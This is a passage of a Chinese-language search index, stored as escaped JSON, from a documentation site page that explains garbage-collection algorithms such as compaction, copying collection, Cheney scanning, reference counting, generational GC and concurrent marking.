u5b57\u200b\u6bb5\u200b\u5f15\u7528\u200b\u5b83\u200b\u5c31\u200b\u4e0d\u200b\u5728\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u88ab\u200b\u904d\u5386\u200b\u5230\u200b\uff1b\u200b\u5982\u679c\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u7b2c\u4e8c\u8f6e\u200b\u548c\u200b\u7b2c\u4e09\u8f6e\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u7b2c\u4e8c\u8f6e\u200b\u9700\u8981\u200b\u6539\u5199\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u8fd9\u4e9b\u200b\u5bf9\u8c61\u200b\u672c\u8eab\u200b\u4e0d\u80fd\u200b\u88ab\u200b\u632a\u8d70\u200b\uff0c\u200b\u4f46\u662f\u200b\u7b2c\u4e09\u8f6e\u200b\u5728\u200b\u79fb\u52a8\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u4f1a\u200b\u6539\u53d8\u200b\u5730\u5740\u200b\u6bd4\u200b\u5f53\u524d\u200b\u5bf9\u8c61\u200b\u5c0f\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002</p> <p>\u200b\u7ed3\u5408\u200b\u8fd9\u4e2a\u200b\u5206\u6790\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6539\u8fdb\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u4e24\u8f6e\u200b\u904d\u5386\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u8f6e\u200b\uff0c\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5f80\u200b\u9ad8\u200b\u904d\u5386\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u88ab\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u9996\u5148\u200b\u6839\u636e\u200b\u5f53\u524d\u200b\u5bf9\u8c61\u200b\u7684\u200b\u94fe\u8868\u200b\u53bb\u200b\u6062\u590d\u200b\u5f15\u7528\u200b\u5f53\u524d\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u7531\u4e8e\u200b\u904d\u5386\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u53ea\u6709\u200b\u5730\u5740\u200b\u4f4e\u200b\u5f15\u7528\u200b\u5730\u5740\u200b\u9ad8\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u4f1a\u200b\u88ab\u200b\u4fee\u6b63\u200b\uff08\u200b\u79f0\u4e3a\u200b\u201c\u200b\u524d\u5411\u200b\u201d\u200b\u5f15\u7528\u200b\uff09\uff1b\u200b\u7136\u540e\u200b\uff0c\u200b\u4e5f\u200b\u4ee5\u200b\u5f53\u524d\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u53bb\u200b\u6784\u9020\u200b\u94fe\u8868\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5730\u5740\u200b\u9ad8\u200b\u5f15\u7528\u200b\u5730\u5740\u200b\u4f4e\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff08\u200b\u79f0\u4e3a\u200b\u201c\u200b\u540e\u200b\u5411\u200b\u201d\u200b\u5f15\u7528\u200b\uff09\u200b\u4f1a\u200b\u7559\u4e0b\u6765\u200b\uff0c\u200b\u7528\u4e8e\u200b\u7b2c\u4e8c\u8f6e\u200b</li> <li>\u200b\u7b2c\u4e8c\u8f6e\u200b\uff0c\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5f80\u200b\u9ad8\u200b\u904d\u5386\u200b\uff0c\u200b\u6b64\u65f6\u200b\u524d\u200b\u5411\u200b\u7684\u200b\u5f15\u7528\u200b\u90fd\u200b\u88ab\u200b\u4fee\u6b63\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u79fb\u52a8\u200b\u5bf9\u8c61\u200b\u5230\u200b\u88ab\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4e0d\u7528\u200b\u62c5\u5fc3\u200b\u51fa\u9519\u200b\uff1b\u200b\u800c\u200b\u6b64\u65f6\u200b\u7b2c\u4e00\u8f6e\u200b\u4e5f\u200b\u628a\u200b\u540e\u200b\u5411\u200b\u7684\u200b\u5f15\u7528\u200b\u90fd\u200b\u52a0\u5165\u200b\u4e86\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u518d\u200b\u4fee\u6b63\u200b\u540e\u200b\u5411\u200b\u7684\u200b\u5f15\u7528\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u6bd4\u200b\u5f53\u524d\u200b\u5730\u5740\u200b\u5927\u200b\u7684\u200b\u5bf9\u8c61\u200b\u90fd\u200b\u6ca1\u6709\u200b\u88ab\u200b\u79fb\u52a8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4fee\u6539\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b</li> </ol> <p>\u200b\u8fd9\u91cc\u200b\u5229\u7528\u200b\u904d\u5386\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u628a\u200b\u5f15\u7528\u200b\u5206\u4e3a\u200b\u4e86\u200b\u524d\u200b\u5411\u200b\u548c\u200b\u540e\u200b\u5411\u200b\uff0c\u200b\u5de7\u5999\u200b\u5730\u200b\u628a\u200b\u4e09\u8f6e\u200b\u6539\u6210\u200b\u4e86\u200b\u4e24\u8f6e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u6b63\u786e\u6027\u200b\u3002\u200b\u7531\u4e8e\u200b\u904d\u5386\u200b\u7684\u200b\u987a\u5e8f\u200b\u76f8\u540c\u200b\uff0c\u200b\u4e24\u8f6e\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u5bf9\u8c61\u200b\u88ab\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\u4e5f\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u8282\u7701\u200b\u4e86\u200b\u5185\u5b58\u200b\u3002\u200b\u8fd9\u91cc\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5de7\u5999\u200b\u7684\u200b\u8282\u7701\u200b\u7a7a\u95f4\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b\u539f\u6765\u200b\u5bf9\u8c61\u200b\u5934\u90e8\u200b\u7684\u200b\u7a7a\u95f4\u200b\u62ff\u6765\u200b\u5b58\u200b\u6307\u9488\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u5934\u90e8\u200b\u7a7a\u95f4\u200b\u539f\u6765\u200b\u7684\u200b\u5185\u5bb9\u200b\u653e\u5230\u200b\u94fe\u8868\u200b\u7684\u200b\u672b\u5c3e\u200b\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u6062\u590d\u200b\u56de\u6765\u200b\uff0c\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u533a\u5206\u200b\u6307\u9488\u200b\u548c\u200b\u5bf9\u8c61\u200b\u5934\u90e8\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u5728\u200b Algorithms for Dynamic Memory Management (236780) Lecture 2 by Erez Petrank \u200b\u4e2d\u6709\u200b\u8be6\u7ec6\u200b\u7684\u200b step by step \u200b\u56fe\u793a\u200b\uff0c\u200b\u5efa\u8bae\u200b\u8bfb\u8005\u200b\u9605\u8bfb\u200b\u3002</p>"},{"location":"software/gc.html#one-pass-compaction","title":"One Pass Compaction","text":"<p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b Compaction \u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u53eb\u505a\u200b One Pass Compaction\u3002\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b\u51e0\u79cd\u200b Compact \u200b\u7b97\u6cd5\u200b\u4e2d\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u626b\u63cf\u200b\u5806\u4e2d\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u4ece\u800c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5b83\u4eec\u200b\u88ab\u200b compact \u200b\u540e\u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b\u3002\u200b\u800c\u200b One Pass Compaction \u200b\u4e0d\u662f\u200b\u626b\u63cf\u200b\u5806\u4e2d\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u800c\u662f\u200b\u626b\u63cf\u200b bitmap\uff0cbitmap \u200b\u8bb0\u5f55\u200b\u4e86\u200b\u5806\u200b\u4e2d\u200b\u54ea\u4e9b\u200b\u90e8\u5206\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u54ea\u4e9b\u200b\u90e8\u5206\u200b\u6ca1\u6709\u200b\u3002\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5b83\u200b\u8fdb\u884c\u200b\u5982\u4e0b\u200b\u7684\u200b\u9884\u5904\u7406\u200b\u64cd\u4f5c\u200b\uff1a</p> <ol> <li>\u200b\u628a\u200b\u5806\u200b\u5206\u6210\u200b\u82e5\u5e72\u4e2a\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6bcf\u4e2a\u200b\u5757\u200b 256 \u200b\u5b57\u8282\u200b</li> <li>\u200b\u867d\u7136\u200b\u4e0d\u200b\u77e5\u9053\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5185\u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u4f46\u662f\u200b\u901a\u8fc7\u200b bitmap\uff0c\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5185\u200b\u5206\u914d\u200b\u4e86\u200b\u591a\u5c11\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u5bf9\u8c61\u200b</li> <li>\u200b\u4ee5\u5757\u200b\u7684\u200b\u7c92\u5ea6\u200b\uff0c\u200b\u6309\u7167\u200b\u987a\u5e8f\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u5757\u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5f97\u5230\u200b\u6bcf\u4e2a\u200b\u5757\u200b\u5728\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b</li> </ol> <p>\u200b\u6709\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u200b\u904d\u5386\u200b\u5806\u91cc\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u6b64\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u9884\u5904\u7406\u200b\u597d\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u5728\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff1a</p> <ol> <li>\u200b\u9996\u5148\u200b\u6839\u636e\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u627e\u5230\u200b\u5b83\u200b\u5c5e\u4e8e\u200b\u54ea\u4e2a\u200b\u5757\u200b\uff0c\u200b\u5e76\u200b\u5904\u4e8e\u200b\u5757\u200b\u5185\u200b\u7684\u200b\u7b2c\u51e0\u4e2a\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5b83\u200b\u524d\u9762\u200b\u8981\u200b\u4fdd\u5b58\u200b\u591a\u5c11\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u5757\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u52a0\u4e0a\u200b\u5757\u200b\u5185\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u5bf9\u8c61\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b</li> </ol> <p>\u200b\u6709\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5bf9\u8c61\u200b\u548c\u200b\u5404\u4e2a\u200b\u5b57\u6bb5\u200b\u4e2d\u200b\u7684\u200b\u6307\u9488\u200b\u6309\u7167\u200b\u540c\u6837\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6620\u5c04\u200b\u5230\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5728\u200b\u79fb\u52a8\u200b\u5bf9\u8c61\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u628a\u200b\u6307\u9488\u200b\u66f4\u65b0\u200b\u597d\u200b\u4e86\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u4e8b\u5b9e\u4e0a\u200b\u5c31\u662f\u200b\u901a\u8fc7\u200b\u5206\u5757\u200b\uff0c\u200b\u52a0\u901f\u200b\u4e86\u200b\u5730\u5740\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5730\u5740\u200b\u8ba1\u7b97\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u4e24\u8f6e\u200b\u904d\u5386\u200b\u3002\u200b\u4e25\u683c\u6765\u8bf4\u200b\uff0c\u200b\u904d\u5386\u200b bitmap \u200b\u4e5f\u200b\u8981\u200b\u4e00\u8f6e\u200b\uff0c\u200b\u4f46\u662f\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff08\u200b\u82e5\u5e72\u4e2a\u200b\u5b57\u8282\u200b\u5bf9\u5e94\u200b bitmap \u200b\u7684\u200b\u4e00\u4e2a\u200b bit\uff09\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u200b\u4e0d\u7b97\u200b\u6210\u200b\u4e00\u8f6e\u200b\u4e86\u200b\u3002</p>"},{"location":"software/gc.html#copying-collection","title":"Copying Collection","text":"<p>Copying Collection \u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u5806\u200b\u5206\u6210\u200b\u4e24\u4e2a\u200b\u533a\u57df\u200b\uff0c\u200b\u5206\u522b\u200b\u53eb\u505a\u200b fromspace \u200b\u548c\u200b tospace\u3002\u200b\u4e00\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4fdd\u5b58\u200b\u5728\u200b fromspace \u200b\u4e2d\u200b\uff0c\u200b\u8981\u200b\u8fdb\u884c\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4ece\u200b fromspace \u200b\u62f7\u8d1d\u5230\u200b tospace \u200b\u7684\u200b\u8fde\u7eed\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u3002\u200b\u5f53\u200b\u6240\u6709\u200b\u5bf9\u8c61\u200b\u62f7\u8d1d\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cfromspace \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u6e05\u7a7a\u200b\u3002\u200b\u4e4b\u540e\u200b tospace \u200b\u548c\u200b fromspace \u200b\u7684\u200b\u89d2\u8272\u200b\u4e92\u6362\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b double buffer \u200b\u90a3\u6837\u200b\u3002</p> <p>\u200b\u5728\u200b\u62f7\u8d1d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u548c\u200b\u4e4b\u524d\u200b\u7684\u200b Compact \u200b\u7b97\u6cd5\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u5bf9\u8c61\u200b\u7684\u200b forwardingAddress\uff1a\u200b\u5f53\u200b\u5bf9\u8c61\u200b\u4ece\u200b fromspace \u200b\u8fc1\u79fb\u200b\u5230\u200b tospace \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b fromspace \u200b\u7684\u200b\u90a3\u200b\u4e00\u4efd\u200b\u5bf9\u8c61\u200b\u7684\u200b forwardingAddress \u200b\u8bb0\u5f55\u200b\u7684\u200b\u662f\u200b\u5b83\u200b\u5728\u200b tospace \u200b\u91cc\u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5229\u7528\u200b fromspace \u200b\u91cc\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u539f\u5730\u4fdd\u5b58\u200b forwardingAddress\u3002</p>"},{"location":"software/gc.html#cheney-scanning","title":"Cheney Scanning","text":"<p>\u200b\u5728\u200b\u904d\u5386\u200b fromspace \u200b\u7684\u200b\u5bf9\u8c61\u200b\u7528\u4e8e\u200b\u590d\u5236\u200b\u7684\u200b\u7b97\u6cd5\u200b\u4e2d\u200b\uff0cCheney Scanning \u200b\u7b97\u6cd5\u200b\u662f\u200b\u4e00\u79cd\u200b\u7ecf\u5178\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u7528\u200b tospace \u200b\u6765\u200b\u7ef4\u62a4\u200b BFS \u200b\u7684\u200b\u961f\u5217\u200b\uff1a</p> <ol> <li>\u200b\u9996\u5148\u200b\u628a\u200b GC root \u200b\u5f15\u7528\u200b\u7684\u200b\u5bf9\u8c61\u200b\u590d\u5236\u5230\u200b tospace \u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u7ef4\u62a4\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff1a<code>scan</code> \u200b\u4e00\u200b\u5f00\u59cb\u200b\u6307\u5411\u200b tospce \u200b\u7a7a\u95f4\u200b\u7684\u200b\u6700\u200b\u5f00\u5934\u200b\uff0c<code>free</code> \u200b\u6307\u5411\u200b tospace \u200b\u4e2d\u200b\u7a7a\u95f2\u200b\u7684\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5f00\u5934\u200b</li> <li>\u200b\u4ece\u200b <code>scan</code> \u200b\u6307\u9488\u200b\u5f00\u59cb\u200b\uff0c\u200b\u626b\u63cf\u200b tospace \u200b\u5df2\u6709\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u627e\u5230\u200b\u5b83\u200b\u6240\u200b\u5f15\u7528\u200b\u7684\u200b\u5728\u200b fromspace \u200b\u4e2d\u200b\u8fd8\u200b\u6ca1\u200b\u590d\u5236\u5230\u200b tospace \u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b fromspace \u200b\u4e2d\u200b\u7684\u200b\u5bf9\u8c61\u200b\u590d\u5236\u5230\u200b tospace \u200b\u4e2d\u200b <code>free</code> \u200b\u6307\u5411\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u66f4\u65b0\u200b forwardingAddress\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b <code>free</code> \u200b\u6307\u5411\u200b\u5269\u4f59\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u5f53\u200b <code>scan</code> \u200b\u7b49\u4e8e\u200b <code>free</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b fromspace \u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u590d\u5236\u200b\u5b8c\u6bd5\u200b</li> </ol>"},{"location":"software/gc.html#reference-counting","title":"Reference Counting","text":"<p>Reference Counting \u200b\u5c31\u662f\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5f15\u7528\u200b\u6b21\u6570\u200b\uff0c\u200b\u5f53\u200b\u6b21\u6570\u200b\u964d\u200b\u4e3a\u200b 0 \u200b\u7684\u200b\u65f6\u5019\u200b\u91ca\u653e\u200b\u3002\u200b\u5178\u578b\u200b\u7684\u200b\u5b9e\u73b0\u200b\u6709\u200b C++ \u200b\u7684\u200b shared_ptr\uff0cRust \u200b\u7684\u200b Rc \u200b\u548c\u200b Arc\u3002</p>"},{"location":"software/gc.html#generational-garbage-collection","title":"Generational Garbage Collection","text":"<p>\u200b\u9488\u5bf9\u200b\u4e0d\u540c\u200b\u5bf9\u8c61\u200b\u7684\u200b\u751f\u547d\u5468\u671f\u200b\u957f\u77ed\u200b\u4e0d\u540c\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u591a\u4e2a\u200b generation \u200b\u7684\u200b heap\uff1a\u200b\u5bf9\u200b\u5b58\u6d3b\u200b\u65f6\u95f4\u200b\u6bd4\u8f83\u200b\u77ed\u200b\u7684\u200b\u5bf9\u8c61\u200b\u8fdb\u884c\u200b\u66f4\u200b\u9891\u7e41\u200b\u7684\u200b\u5783\u573e\u200b\u56de\u6536\u200b\uff0c\u200b\u628a\u200b\u5b58\u6d3b\u200b\u65f6\u95f4\u200b\u8f83\u957f\u200b\u7684\u200b\u5bf9\u8c61\u200b\u8fc1\u79fb\u200b\u5230\u200b\u66f4\u200b\u65e7\u200b\u7684\u200b generation \u200b\u7684\u200b heap \u200b\u4e0a\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u66f4\u200b\u4f4e\u200b\u9891\u7387\u200b\u7684\u200b\u5783\u573e\u200b\u56de\u6536\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u5c11\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b Generational Garbage Collection\u3002\u200b\u5b83\u200b\u7684\u200b\u4f18\u70b9\u200b\u662f\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u66f4\u200b\u77ed\u200b\u7684\u200b pause time\uff0c\u200b\u56e0\u4e3a\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u7684\u200b\u7c92\u5ea6\u200b\u53d8\u5c0f\u200b\u4e86\u200b\u3002</p>"},{"location":"software/gc.html#parallel-incremental-concurrent","title":"Parallel, Incremental \u200b\u548c\u200b Concurrent","text":"<p>\u200b\u4e3a\u4e86\u200b\u6539\u8fdb\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u7684\u200b\u6027\u80fd\u200b\u4ee5\u53ca\u200b\u5bf9\u200b pause time \u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u6709\u200b\u8fd9\u4e48\u200b\u51e0\u4e2a\u200b\u6982\u5ff5\u200b\uff1a</p> <ol> <li>Parallel\uff1a\u200b\u628a\u200b\u5355\u7ebf\u7a0b\u200b\u7684\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u64cd\u4f5c\u200b\u5206\u914d\u200b\u5230\u200b\u591a\u4e2a\u200b\u7ebf\u7a0b\u200b\u4e0a\u200b\uff0c\u200b\u4e3b\u8981\u200b\u76ee\u7684\u200b\u662f\u200b\u52a0\u901f\u200b\u5783\u573e\u200b\u56de\u6536\u200b\uff0c\u200b\u4f46\u200b\u53ef\u80fd\u200b\u8fd8\u662f\u200b stop the world\uff0c\u200b\u53ea\u662f\u200b\u51cf\u5c11\u200b pause time</li> <li>Incremental\uff1a\u200b\u628a\u200b\u4e00\u6b21\u200b\u5b8c\u6574\u200b\u7684\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u64cd\u4f5c\u200b\u62c6\u6210\u200b\u591a\u6b21\u200b\uff0c\u200b\u4e00\u6b21\u200b\u957f\u200b\u7684\u200b pause \u200b\u88ab\u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b\u77ed\u200b\u7684\u200b pause\uff0c\u200b\u4e3b\u8981\u200b\u76ee\u7684\u200b\u662f\u200b\u51cf\u5c11\u200b\u6700\u5927\u200b\u7684\u200b pause time\uff0c\u200b\u6539\u8fdb\u200b\u54cd\u5e94\u200b\u6027\u200b</li> <li>Concurrent\uff1a\u200b\u4e0d\u200b stop the world\uff0cmutator \u200b\u548c\u200b collector \u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u6838\u5fc3\u200b\u4e0a\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b</li> </ol>"},{"location":"software/gc.html#concurrent-garbage-collection","title":"Concurrent Garbage Collection","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0cConcurrent Garbage Collection \u200b\u662f\u200b\u8bf4\u200b mutator \u200b\u548c\u200b collector \u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b collector \u200b\u5728\u200b\u6807\u8bb0\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cmutator \u200b\u4fee\u6539\u200b\u4e86\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5f15\u7528\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u672c\u6765\u200b\u5e94\u8be5\u200b\u662f\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u6ca1\u6709\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e0a\u200b\u3002\u200b\u4f8b\u5982\u200b collector \u200b\u4ece\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b\u62d3\u5c55\u200b\u6807\u8bb0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cmutator \u200b\u7ed9\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5f15\u7528\u200b\u5230\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4e0a\u200b\uff0c\u200b\u56e0\u4e3a\u200b collector \u200b\u8ba4\u4e3a\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u5df2\u7ecf\u200b\u5904\u7406\u5b8c\u6bd5\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u77e5\u9053\u200b\u5b83\u200b\u540e\u6765\u200b\u53c8\u200b\u5f15\u51fa\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u8fb9\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u5f53\u200b\u51fa\u73b0\u200b\u5982\u4e0b\u200b\u60c5\u51b5\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b lost object \u200b\u95ee\u9898\u200b\uff1a</p> <ol> <li>mutator \u200b\u5efa\u7acb\u200b\u4e86\u200b\u4e00\u6761\u200b\u4ece\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u5230\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u7684\u200b\u8fb9\u200b</li> <li>\u200b\u5e76\u4e14\u200b\u4ece\u200b\u5df2\u6709\u200b\u7684\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b\u5230\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u6ca1\u6709\u200b\u8def\u5f84\u200b</li> </ol> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5728\u200b mutator 